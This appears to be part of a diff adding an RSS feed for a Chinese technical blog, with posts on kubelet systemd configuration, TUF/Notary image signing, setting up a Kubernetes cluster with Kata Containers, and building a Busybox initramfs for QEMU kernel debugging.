+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt; 3&lt;/span&gt;&lt;span class="cl"&gt;&lt;span class="nv"&gt;Description&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;kubelet: The Kubernetes Node Agent
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt; 4&lt;/span&gt;&lt;span class="cl"&gt;&lt;span class="nv"&gt;Documentation&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;http://kubernetes.io/docs/
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt; 5&lt;/span&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt; 6&lt;/span&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;Service&lt;span class="o"&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt; 7&lt;/span&gt;&lt;span class="cl"&gt;&lt;span class="nv"&gt;ExecStart&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;/usr/bin/kubelet
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt; 8&lt;/span&gt;&lt;span class="cl"&gt;&lt;span class="nv"&gt;Restart&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;always
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt; 9&lt;/span&gt;&lt;span class="cl"&gt;&lt;span class="nv"&gt;StartLimitInterval&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt;10&lt;/span&gt;&lt;span class="cl"&gt;&lt;span class="nv"&gt;RestartSec&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;10&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt;11&lt;/span&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt;12&lt;/span&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;Install&lt;span class="o"&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt;13&lt;/span&gt;&lt;span class="cl"&gt;&lt;span class="nv"&gt;WantedBy&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;multi-user.target
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt;14&lt;/span&gt;&lt;span class="cl"&gt;EOF
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;上面就是简单的调用了下kubelet命令，实际上还有很多参数，这个不着急。因为我们是用kubeadm配置的，所以实际上生效的是kubeadm为kubelet设置的参数，kubelet的启动将依赖kubeadm设置的bootstrap配置：&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt; 1&lt;/span&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;# mkdir -p /etc/systemd/system/kubelet.service.d/&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt; 2&lt;/span&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;# cat &amp;gt; /etc/systemd/system/kubelet.service.d/10-kubeadm.conf &amp;lt;&amp;lt; EOF&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt; 3&lt;/span&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;Service&lt;span class="o"&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt; 4&lt;/span&gt;&lt;span class="cl"&gt;&lt;span class="nv"&gt;Environment&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;KUBELET_KUBECONFIG_ARGS=--bootstrap-kubeconfig=/etc/kubernetes/bootstrap-kubelet.conf --kubeconfig=/etc/kubernetes/kubelet.conf&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt; 5&lt;/span&gt;&lt;span class="cl"&gt;&lt;span class="nv"&gt;Environment&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;KUBELET_CONFIG_ARGS=--config=/var/lib/kubelet/config.yaml&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt; 6&lt;/span&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;# This is a file that &amp;#34;kubeadm init&amp;#34; and &amp;#34;kubeadm join&amp;#34; generates at runtime, populating the KUBELET_KUBEADM_ARGS variable dynamically&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt; 7&lt;/span&gt;&lt;span class="cl"&gt;&lt;span class="nv"&gt;EnvironmentFile&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;-/var/lib/kubelet/kubeadm-flags.env
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt; 8&lt;/span&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;# This is a file that the user can use for overrides of the kubelet args as a last resort. Preferably,&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt; 9&lt;/span&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;# the user should use the .NodeRegistration.KubeletExtraArgs object in the configuration files instead.&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt;10&lt;/span&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;# KUBELET_EXTRA_ARGS should be sourced from this file.&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt;11&lt;/span&gt;&lt;span class="cl"&gt;&lt;span class="nv"&gt;EnvironmentFile&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;-/etc/default/kubelet
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt;12&lt;/span&gt;&lt;span class="cl"&gt;&lt;span class="nv"&gt;ExecStart&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt;13&lt;/span&gt;&lt;span class="cl"&gt;&lt;span class="nv"&gt;ExecStart&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;/usr/bin/kubelet &lt;span class="nv"&gt;$KUBELET_KUBECONFIG_ARGS&lt;/span&gt; &lt;span class="nv"&gt;$KUBELET_CONFIG_ARGS&lt;/span&gt; &lt;span class="nv"&gt;$KUBELET_KUBEADM_ARGS&lt;/span&gt; &lt;span class="nv"&gt;$KUBELET_EXTRA_ARGS&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt;14&lt;/span&gt;&lt;span class="cl"&gt;EOF
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;设置开机启动&lt;/p&gt;</description></item><item><title>Docker官方镜像签名方案：Notary</title><link>https://weizhang555.github.io/original/notary-intro/</link><pubDate>Tue, 11 Dec 2018 11:20:00 +0800</pubDate><guid>https://weizhang555.github.io/original/notary-intro/</guid><description>
+&lt;h2 id="1-tuf"&gt;1. TUF&lt;/h2&gt;
+&lt;h3 id="11-背景"&gt;1.1 背景&lt;/h3&gt;
+&lt;p&gt;TUF是Tor项目设计出的一套安全分发软件更新的框架，Notary是TUF框架的go语言实现，而Docker Content Trust是TUF框架的应用。理清三者关系有助于后续理解。&lt;/p&gt;
+&lt;h3 id="12-tuf的角色"&gt;1.2 TUF的角色&lt;/h3&gt;
+&lt;p&gt;TUF框架包含五类角色，对应五把密钥，分别是Root, Target, Snapshot, Timestamp, Delegated target(可选)，每个角色对应一个元数据文件及一把密钥。&lt;/p&gt;
+&lt;p&gt;TUF角色和密钥的理解与Notary介绍有重合，可以参考 &amp;quot;2.3 Notary的密钥管理&amp;quot;&lt;/p&gt;
+&lt;h3 id="12-tuf的工作流"&gt;1.2 TUF的工作流&lt;/h3&gt;
+&lt;p&gt;TUF框架的定义在这里：&lt;a href="https://github.com/theupdateframework/specification/blob/master/tuf-spec.md"&gt;https://github.com/theupdateframework/specification/blob/master/tuf-spec.md&lt;/a&gt; 。&lt;/p&gt;
+&lt;h4 id="step-0-加载可信的root元数据文件"&gt;step 0: 加载可信的root元数据文件&lt;/h4&gt;
+&lt;p&gt;这一步可以认为是前奏步骤。一个初始的root元数据文件应该早已经随包管理器交付到客户端，或者通过带外流程放置进去了。此时的root元数据文件的超时不重要，因为下一步会更新它。&lt;/p&gt;
+&lt;h4 id="step-1-更新root元数据文件"&gt;step 1: 更新root元数据文件&lt;/h4&gt;
+&lt;p&gt;由于现在元数据文件可能是被完全不同的一组key签名的，客户端必须有办法能持续的更新到最新的密钥，通过不断的下载中间阶段的密钥一直到最新版。&lt;/p&gt;
+&lt;h5 id="step-11-使用n代表可信root元数据文件的版本号"&gt;step 1.1: 使用N代表可信root元数据文件的版本号&lt;/h5&gt;
+&lt;h5 id="step-12-下载root元数据文件的n1版本"&gt;step 1.2: 下载root元数据文件的N+1版本&lt;/h5&gt;
+&lt;p&gt;文件名是固定的格式：VERSION_NUMBER.FILENAME.EXT (e.g., 42.root.json)。不成功的话跳转到1.8步。&lt;/p&gt;
+&lt;h5 id="step-13-检查签名"&gt;step 1.3: 检查签名&lt;/h5&gt;
+&lt;p&gt;N+1版的root元数据必须被以下密钥签名：1）N版本root元数据内指定的达到阈值数量的密钥。2）新版本的root元数据里指定的达到阈值数量的密钥。&lt;br /&gt;
+如果N+1版本的root元数据没有被正确签名，退出并报错。&lt;/p&gt;
+&lt;h5 id="step-14-检查回滚攻击rollback-attach"&gt;step 1.4: 检查回滚攻击(rollback attach)&lt;/h5&gt;
+&lt;p&gt;当前信任的root元数据文件版本（N）必须小于新的root元数据文件（N+1）。如果不是退出并报错。&lt;/p&gt;
+&lt;h5 id="step-15-新版本元数据文件的超时时间可以忽略18会检查"&gt;step 1.5: 新版本元数据文件的超时时间可以忽略，1.8会检查&lt;/h5&gt;
+&lt;h5 id="step-16-设置受信任的root元数据文件为新的元数据文件"&gt;step 1.6: 设置受信任的root元数据文件为新的元数据文件&lt;/h5&gt;
+&lt;h5 id="step-17-重复step-11到17直到root元数据为最新"&gt;step 1.7: 重复step 1.1到1.7直到root元数据为最新&lt;/h5&gt;
+&lt;h5 id="step-18-检查冻结攻击freeze-attach"&gt;step 1.8: 检查冻结攻击(freeze attach)&lt;/h5&gt;
+&lt;p&gt;检查当前的信任的root元数据文件是否过期，过期的报错退出。&lt;/p&gt;
+&lt;h5 id="step-19-如果timestamp和或snapshot密钥已经改变删掉snapshot和timestamp元数据文件"&gt;step 1.9: 如果timestamp和/或snapshot密钥已经改变，删掉snapshot和timestamp元数据文件&lt;/h5&gt;
+&lt;p&gt;这个是为了从快进攻击(fast-forward attach)中恢复出来。快进攻击是攻击者可以任意增加元数据的版本号：1）timestamp元数据。2）snapshot元数据。3）targets元数据。&lt;/p&gt;
+&lt;h4 id="step-2-下载timestamp元数据文件"&gt;step 2: 下载timestamp元数据文件&lt;/h4&gt;
+&lt;p&gt;下载固定文件名timestamp.json&lt;/p&gt;</description></item><item><title>创建kata的K8s集群</title><link>https://weizhang555.github.io/original/create-k8s-cluster-with-kata/</link><pubDate>Sat, 18 Aug 2018 19:10:00 +0800</pubDate><guid>https://weizhang555.github.io/original/create-k8s-cluster-with-kata/</guid><description>
+&lt;p&gt;本文介绍下如何创建kata的k8s集群，
+kata项目链接：https://github.com/kata-containers
+kata是什么不介绍了，能看到这篇文章的相信对kata都已经有一定了解了。&lt;/p&gt;
+&lt;p&gt;本文参考了官方的安装说明：
+&lt;a href="https://github.com/kata-containers/documentation/blob/master/how-to/how-to-use-k8s-with-cri-containerd-and-kata.md"&gt;https://github.com/kata-containers/documentation/blob/master/how-to/how-to-use-k8s-with-cri-containerd-and-kata.md&lt;/a&gt;
+实际上仅仅安装没有什么好讲的，文档里讲的很清楚了。但是在我们恶劣的大网络环境下，就变得有点技巧了。&lt;/p&gt;
+&lt;p&gt;以下为正文&lt;/p&gt;
+&lt;hr&gt;
+&lt;h2 id="安装环境"&gt;安装环境&lt;/h2&gt;
+&lt;p&gt;Virtual Machine:&lt;/p&gt;
+&lt;p&gt;OS: Ubuntu 18.04&lt;/p&gt;
+&lt;p&gt;CPU: 4&lt;/p&gt;
+&lt;p&gt;Memory: 8G&lt;/p&gt;
+&lt;p&gt;在虚拟化环境中，务必保证嵌套虚拟化打开。&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;虚拟化软件必须要支持&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;可以在guest OS里面通过以下命令检查：&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt;1&lt;/span&gt;&lt;span class="cl"&gt;$ sudo grep -E &lt;span class="s2"&gt;&amp;#34;(vmx|svm)&amp;#34;&lt;/span&gt; --color&lt;span class="o"&gt;=&lt;/span&gt;always /proc/cpuinfo
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;如果没有显示则不支持硬件虚拟化。需要打开相应的虚拟化选项，如果是物理机则需要bios里面启用虚拟化支持。&lt;/p&gt;
+&lt;ol start="2"&gt;
+&lt;li&gt;启动kvm_intel的嵌套虚拟化支持&lt;/li&gt;
+&lt;/ol&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt;1&lt;/span&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;# modprobe -r kvm_intel&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt;2&lt;/span&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;# modprobe kvm_intel nested=1&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id="安装kata-containers"&gt;安装kata-containers&lt;/h2&gt;
+&lt;p&gt;参考：&lt;/p&gt;
+&lt;p&gt;&lt;a href="https://github.com/kata-containers/documentation/blob/master/install/ubuntu-installation-guide.md"&gt;https://github.com/kata-containers/documentation/blob/master/install/ubuntu-installation-guide.md&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;运行以下命令：&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt;1&lt;/span&gt;&lt;span class="cl"&gt;$ sudo sh -c &lt;span class="s2"&gt;&amp;#34;echo &amp;#39;deb http://download.opensuse.org/repositories/home:/katacontainers:/release/xUbuntu_&lt;/span&gt;&lt;span class="k"&gt;$(&lt;/span&gt;lsb_release -rs&lt;span class="k"&gt;)&lt;/span&gt;&lt;span class="s2"&gt;/ /&amp;#39; &amp;gt; /etc/apt/sources.list.d/kata-containers.list&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt;2&lt;/span&gt;&lt;span class="cl"&gt;$ curl -sL http://download.opensuse.org/repositories/home:/katacontainers:/release/xUbuntu_&lt;span class="k"&gt;$(&lt;/span&gt;lsb_release -rs&lt;span class="k"&gt;)&lt;/span&gt;/Release.key &lt;span class="p"&gt;|&lt;/span&gt; sudo apt-key add -
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt;3&lt;/span&gt;&lt;span class="cl"&gt;$ sudo -E apt-get update
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt;4&lt;/span&gt;&lt;span class="cl"&gt;$ sudo -E apt-get -y install kata-runtime kata-proxy kata-shim
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id="安装docker"&gt;安装docker&lt;/h2&gt;
+&lt;p&gt;参考：&lt;/p&gt;</description></item><item><title>Kernel调试基础--制作initramfs</title><link>https://weizhang555.github.io/original/make-initramfs-for-qemu-start/</link><pubDate>Thu, 12 Apr 2018 19:10:00 +0800</pubDate><guid>https://weizhang555.github.io/original/make-initramfs-for-qemu-start/</guid><description>
+&lt;p&gt;通过自己制作initramfs可以使用qemu启动自定义的内核，
+可以用于调试或测试。这里记录一下制作简单的initramfs的脚本，
+方便后续使用。&lt;/p&gt;
+&lt;p&gt;本文参考了链接：&lt;a href="https://gist.github.com/pacalet/660fa6472e0bcd53f71fc31f167c628f"&gt;Building a minimal Linux / Busybox OS for Qemu&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;完整脚本如下：&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt; 1&lt;/span&gt;&lt;span class="cl"&gt;&lt;span class="cp"&gt;#!/bin/bash
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt; 2&lt;/span&gt;&lt;span class="cl"&gt;&lt;span class="nb"&gt;set&lt;/span&gt; -e
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt; 3&lt;/span&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt; 4&lt;/span&gt;&lt;span class="cl"&gt;&lt;span class="nv"&gt;CWD&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="sb"&gt;`&lt;/span&gt;&lt;span class="nb"&gt;pwd&lt;/span&gt;&lt;span class="sb"&gt;`&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt; 5&lt;/span&gt;&lt;span class="cl"&gt;&lt;span class="nv"&gt;BUSYBOX_FILE&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;busybox-1.28.1
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt; 6&lt;/span&gt;&lt;span class="cl"&gt;&lt;span class="nv"&gt;BUSYBOX_SRC&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;/tmp/busybox
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt; 7&lt;/span&gt;&lt;span class="cl"&gt;&lt;span class="nv"&gt;BUSYBOX_BUILD&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;/tmp/busybox-build
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt; 8&lt;/span&gt;&lt;span class="cl"&gt;&lt;span class="nv"&gt;INITRAMFS_DIR&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;/tmp/initramfs
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt; 9&lt;/span&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt;10&lt;/span&gt;&lt;span class="cl"&gt;mkdir -p &lt;span class="nv"&gt;$BUSYBOX_SRC&lt;/span&gt; &lt;span class="nv"&gt;$BUSYBOX_BUILD&lt;/span&gt; &lt;span class="nv"&gt;$INITRAMFS_DIR&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt;11&lt;/span&gt;&lt;span class="cl"&gt;&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt; ! -e &lt;span class="nv"&gt;$BUSYBOX_FILE&lt;/span&gt; &lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="k"&gt;then&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt;12&lt;/span&gt;&lt;span class="cl"&gt; wget http://busybox.net/downloads/&lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;BUSYBOX_FILE&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;.tar.bz2
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt;13&lt;/span&gt;&lt;span class="cl"&gt;&lt;span class="k"&gt;fi&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt;14&lt;/span&gt;&lt;span class="cl"&gt;tar -C &lt;span class="nv"&gt;$BUSYBOX_SRC&lt;/span&gt; -xvf &lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;BUSYBOX_FILE&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;.tar.bz2
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt;15&lt;/span&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt;16&lt;/span&gt;&lt;span class="cl"&gt;&lt;span class="nb"&gt;cd&lt;/span&gt; &lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;BUSYBOX_SRC&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;/&lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;BUSYBOX_FILE&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; make &lt;span class="nv"&gt;O&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;BUSYBOX_BUILD&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt; defconfig
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt;17&lt;/span&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;# enable busybox static build&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt;18&lt;/span&gt;&lt;span class="cl"&gt;&lt;span class="nb"&gt;cd&lt;/span&gt; &lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;BUSYBOX_BUILD&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; sed -i &lt;span class="s2"&gt;&amp;#34;s/# CONFIG_STATIC is not set/CONFIG_STATIC=y/&amp;#34;&lt;/span&gt; .config &lt;span class="se"&gt;\
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt;19&lt;/span&gt;&lt;span class="cl"&gt; &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; make &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; make install
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt;20&lt;/span&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt;21&lt;/span&gt;&lt;span class="cl"&gt;&lt;span class="nb"&gt;cd&lt;/span&gt; &lt;span class="nv"&gt;$INITRAMFS_DIR&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; rm -rfv * &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; mkdir -p bin sbin etc proc sys usr/bin usr/sbin &lt;span class="se"&gt;\
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt;22&lt;/span&gt;&lt;span class="cl"&gt; &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; cp -a &lt;span class="nv"&gt;$BUSYBOX_BUILD&lt;/span&gt;/_install/* .
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt;23&lt;/span&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt;24&lt;/span&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;# if you want to add iozone binary and its linked .so, you can add command here:&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt;25&lt;/span&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;# cp iozone $INITRAMFS_DIR/bin&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt;26&lt;/span&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt;27&lt;/span&gt;&lt;span class="cl"&gt;cat &amp;gt; &lt;span class="nv"&gt;$INITRAMFS_DIR&lt;/span&gt;/init &lt;span class="s"&gt;&amp;lt;&amp;lt; &amp;#39;EOF&amp;#39;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt;28&lt;/span&gt;&lt;span class="cl"&gt;&lt;span class="s"&gt;#!/bin/sh
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt;29&lt;/span&gt;&lt;span class="cl"&gt;&lt;span class="s"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt;30&lt;/span&gt;&lt;span class="cl"&gt;&lt;span class="s"&gt;mount -t proc none /proc
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt;31&lt;/span&gt;&lt;span class="cl"&gt;&lt;span class="s"&gt;mount -t sysfs none /sys
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt;32&lt;/span&gt;&lt;span class="cl"&gt;&lt;span class="s"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt;33&lt;/span&gt;&lt;span class="cl"&gt;&lt;span class="s"&gt;cat &amp;lt;&amp;lt;!
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt;34&lt;/span&gt;&lt;span class="cl"&gt;&lt;span class="s"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt;35&lt;/span&gt;&lt;span class="cl"&gt;&lt;span class="s"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt;36&lt;/span&gt;&lt;span class="cl"&gt;&lt;span class="s"&gt;Boot took $(cut -d&amp;#39; &amp;#39; -f1 /proc/uptime) seconds
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt;37&lt;/span&gt;&lt;span class="cl"&gt;&lt;span class="s"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt;38&lt;/span&gt;&lt;span class="cl"&gt;&lt;span class="s"&gt; _ _ __ _
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt;39&lt;/span&gt;&lt;span class="cl"&gt;&lt;span class="s"&gt; /\/\ (_)_ __ (_) / /(_)_ __ _ ___ __
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt;40&lt;/span&gt;&lt;span class="cl"&gt;&lt;span class="s"&gt; / \| | &amp;#39;_ \| | / / | | &amp;#39;_ \| | | \ \/ /
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt;41&lt;/span&gt;&lt;span class="cl"&gt;&lt;span class="s"&gt;/ /\/\ \ | | | | | / /__| | | | | |_| |&amp;gt; &amp;lt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt;42&lt;/span&gt;&lt;span class="cl"&gt;&lt;span class="s"&gt;\/ \/_|_| |_|_| \____/_|_| |_|\__,_/_/\_\
